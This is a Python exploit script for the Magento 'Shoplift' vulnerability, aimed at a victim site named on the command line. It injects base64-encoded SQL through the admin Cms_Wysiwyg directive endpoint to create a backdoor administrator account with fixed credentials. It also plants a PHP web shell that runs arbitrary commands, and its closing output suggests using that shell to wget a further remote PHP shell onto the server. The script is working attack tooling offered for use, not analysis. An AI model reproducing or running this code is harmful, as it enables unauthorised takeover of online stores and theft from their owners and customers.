import argparse
from base64 import b64encode
from urllib import urlencode 
import httplib
from bs4 import BeautifulSoup
import requests 
import socket

# Defining global variables
hostname = ""
hostport = 80
createAdmin = False
vulnStatus = False
malware = False

options = argparse.ArgumentParser(description='Exploit for Magento Shoplift Vulnerability')
options.add_argument('hostname', default='your.vic', help='URL to victim site (do not use http(s):// here)')
options.add_argument('-a', '--admin', action='store_true', default=False, dest='login', help='Create admin account with credentials (defaultmanager:password)')
#options.add_argument('-p', '--password', type='str', action='store_const', const='password', default='defaultmanager',help='Password for admin account (default: password)')
options.add_argument('-m', '--malware', action='store_true', default=False, help='Install the PHP malware')

opts = options.parse_args()
if (opts.hostname[:7] != "http://" and opts.hostname[:8] != "https://"):
	hostname = "http://" + opts.hostname
	hostnameSecure = "https://" + opts.hostname
elif (opts.hostname[:8] == "https://"):
	hostname = "http://" + opts.hostname[8:]
	hostnameSecure = opts.hostname
elif (opts.hostname[:7] == "http://"):
	hostname = opts.hostname
	hostnameSecure = "https://" + opts.hostname[7:]
https = False
#hostResolved = socket.gethostbyname(hostname)
if opts.login:
	createAdmin = True
	userName = "defaultmanager"
	passWord = "password"
else:
	createAdmin = False
malware = opts.malware
directive = '{{block type=Adminhtml/report_search_grid output=getCsvFile}}'
latent1 = b64encode(directive)
latent2 = ""
pngFile = "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"
Loud = 0
Heavy = 0
Sneaky = 0
Test = 0

def prepAttack():
	global Loud, Heavy, Sneaky, Test, latent2
	filt = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);\n\n"
	if createAdmin == True:
		adminMake = "SET @SALT = \"rp\";\nSET @PASS = CONCAT(MD5(CONCAT( @SALT , \"password\") ), CONCAT(\":\", @SALT ));\nSELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;\n\nINSERT INTO `admin_user` (firstname,lastname,email,username,password,created,lognum,reload_acl_flag,is_active,extra,rp_token_created_at)\nVALUES ('Firstname','Lastname','email@example.com',\'defaultmanager\',@PASS,NOW(),0,0,1,@EXTRA,NOW());\n\nINSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name)\nVALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = \'defaultmanager\'),'Firstname');"
	if malware == True:
		malwareDropper = "\n\nINSERT INTO `core_file_storage` (content,upload_time,filename,directory_id,directory)\nVALUES ('<?php system($_REQUEST[\"cmd\"]);',NULL,'hook.php',8,'wysiwyg');\n\nINSERT INTO `core_file_storage` (content,upload_time,filename,directory_id,directory)\nVALUES ('<?php $files = array(\"hook.php\", \"line.php\", \"sinker.php\"); foreach ($files as $file) { unlink($file); }',NULL,'sinker.php',8,'wysiwyg');"
	commenter = "--"
	Assault = ""
	if createAdmin & malware:
		Assault = filt + adminMake + malwareDropper + commenter
		print "Prepping... [Attack Mode: 'Going in Loud'\nAttempting: Creation of admin:'{0}' with password:'{1}'\nAlso Attempting: Dropping of hook, line, & sinker]".format(userName, passWord)
		Loud + 1
	elif createAdmin:
		Assault = filt + adminMake + commenter
		#print "username:" + userName #debugging stuff
		#print "password:" + passWord #debugging stuff
		print "Prepping... [Attack Mode: Heavy Assault\nAttempting: Creation of admin:'{0}' with password:'{1}']".format(userName, passWord)
		Heavy + 1
	elif malware:
		Assault = filt + malwareDropper + commenter
		print "Prepping... [Attack Mode: Sneaky Sneaky Assault\nAttempting: Dropping of hook, line, & sinker]"
		Sneaky + 1
	else:
		Assault = filt + commenter
		print "Prepping... [Test Mode: \nAttempting: Nothing.]"
		Test + 1
	latent2 = latent2 + b64encode(Assault)

def POST():
	global vulnStatus, hostname, https
	params = urlencode({'filter': '{0}'.format(latent2), '___directive': '{0}'.format(latent1), 'forwarded': '1'})
	#filterAttack = urlencode(latent2)
	#setDirective = urlencode(latent1)
	headers = {
	'Content-type': 'application/x-www-form-urlencoded',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Encoding': 'gzip, deflate',
	'Connection': 'keep-alive',
	'DNT': '1',
	'Host': '{0}'.format(opts.hostname),
	'Accept-Language': 'en-US,en;q=0.5',
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36',
	'Content-Length': '{0}'.format(len(params))
	}
	#conn = httplib.HTTPConnection(hostResolved,hostport)
	mageRoot = hostname + "/index.php/admin/Cms_Wysiwyg/directive/index/"
	try:
		r = requests.post(mageRoot, headers=headers, data={'filter' : latent2, '___directive' : latent1, 'forwarded': '1'}, allow_redirects=True)
	except requests.TooManyRedirects:
		print "Taking too long to connect via http wrapper, trying "+hostnameSecure+" instead."
		mageRoot = hostnameSecure + "/index.php/admin/Cms_Wysiwyg/directive/index/"
		headers['Connection'] = 'close'
		https = True
		r = requests.post(mageRoot, headers=headers, data={'filter' : latent2, '___directive' : latent1, 'forwarded': '1'}, allow_redirects=False)
	response = r.text
	parsedResponse = BeautifulSoup(response)
	textResponse = parsedResponse.getText()
	errorMsg = 'There has been an error processing your request'
	if (parsedResponse.find('img')) or (filter(lambda x:'PNG' in x, textResponse)) or (filter (lambda x:errorMsg in x, textResponse)):
		vulnStatus = True
		print "Our attack appears to have worked, now for. the next move.."
	else:
		try:
			print(response)
			baseImage = b64encode(str(response))
			if (baseImage == pngFile):
				vulnStatus = True
				print "Our attack appears to have worked, now for. the next move.."	
			else:		
				print "Mission appears to have failed.. But hope is not yet lost!"
				vulnStatus = False
		except UnicodeError:
			vulnStatus = True
			print "Our attack appears to have worked, now for. the next move.."	
	if Loud > 1 or Sneaky > 1:
		GET()

def GET():
	global vulnStatus
	headers = {
	'Content-type': 'application/x-www-form-urlencoded',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Encoding': 'gzip, deflate',
	'Connection': 'keep-alive',
	'DNT': '1',
	'Host': '{0}'.format(hostname[7:]),
	'Accept-Language': 'en-US,en;q=0.5',
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36',
	}
	if (https == False):
		hookHome = hostname + "/get.php//media/wysiwyg/hook.php"
		hookDir = hostname + "/media/wysiwyg/hook.php"
		sinkerHome = hostname + "/get.php//media/wysiwyg/sinker.php"
	else:
		headers['Connection'] = 'close'
		hookHome = hostnameSecure + "/get.php//media/wysiwyg/hook.php"
		hookDir = hostnameSecure + "/media/wysiwyg/hook.php"
		sinkerHome = hostnameSecure + "/get.php//media/wysiwyg/sinker.php"
	setHook = requests.get(hookHome, headers=headers)
	response = setHook.text
	print "Tried to initialize Hook, server responded with " + setHook.status_code + ":" + setHook.reason
	getHook = requests.get(hookDir, headers=headers)
	response = getHook.text
	print "Tried to navigate to Hook, server responded with " + getHook.status_code + ":" + getHook.reason
	if getHook.status_code != '200':
		print "All hope is lost, Hook never landed."
		vulnStatus = False
	else:
		print "Things look promising.. attempting to place sinker."
		requests.get(sinkerHome, headers=headers)
		vulnStatus = True

def report():
	global vulnStatus, Loud, Heavy, Sneaky, Test
	print "Attack Readout [Target: {0}\nVulnerability Status: {1}\nAdmin Attempted: {2}\nMalware Insert Attempted: {3}]".format(hostname[7:], vulnStatus, createAdmin, malware)
	if (vulnStatus == False):
		if Loud > 0:
			print "Might I suggest trying the individual attack options?"
		elif Heavy > 0:
			print "You're welcome to try the other options, however, this one was probably you're best bet. The others may or may not work"
		elif Sneaky > 0:
			print "Might I suggest trying the Admin injection approach, it has a higher likelihood to succeed."
		else:
			print "Site is likely not vulnerable. Utilize other resources such as http://shoplift.byte.nl to be sure."
		print "To be sure, I'm getting a second opinion for you real quick.."
		tmp = 'https://shoplift.byte.nl/scan/'+hostname[7:]+'/admin.json'
		r = requests.get(tmp)
		print r.text
	else:
		print "Congratulations. The results were promising!\nVisit "+hostname+"/index.php/admin and attempt to login.\nIf you went the malware route, visit '"+hostname+"/media/wysiwyg/hook.php?cmd=wget deadly.phpshell.here -O line.php' or w.e. to inject commands directly to the system.\nWhen you're all done, visit '"+hostname+"/media/wysiwyg/sinker.php' and it should delete hook, line, and sinker."
		print "To be sure, I'm getting a second opinion for you real quick.."
		tmp = 'https://shoplift.byte.nl/scan/'+hostname[7:]+'/admin.json'
		r = requests.get(tmp)
		print r.text

def main():
	global hostname
	#if len(opts) < 1:
	#	options.print_help()
	#	return
	#print 'Scanning ' + opts[0]
	prepAttack()
	try:
		POST()
	except requests.exceptions.TooManyRedirects:
		hostname = "https://" + opts.hostname
		POST()
	report()

if __name__ == '__main__':
	main()